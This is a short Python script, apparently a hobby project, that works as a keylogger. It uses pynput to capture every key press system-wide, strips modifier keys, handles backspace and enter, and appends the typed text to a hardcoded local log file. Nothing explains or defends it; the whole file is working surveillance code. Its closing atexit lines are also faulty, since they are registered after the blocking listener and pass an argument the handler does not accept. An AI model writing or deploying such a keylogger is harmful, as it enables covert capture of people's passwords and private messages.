from pynput.keyboard import Listener
import atexit
def log_keystroke(key):
    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = ' '
    if key == 'Key.shift_r' or "Key.ctrl" in key or "Key.alt" in key or "Key.shift" in key:
        key = ''
    if key == 'Key.backspace':
        key = ''
        with open('B:\Projects\Teste\Python\log.txt', 'rb+') as fh:
            fh.seek(-1, 2)
            fh.truncate()
    if key == "Key.enter":
        key = '\n'

    with open("B:\Projects\Teste\Python\log.txt", 'a') as f:
        f.write(key)

with Listener(on_press=log_keystroke) as l:
    l.join()

def OnExitApp():
    print("Exit Python application")

atexit.register(OnExitApp,user='')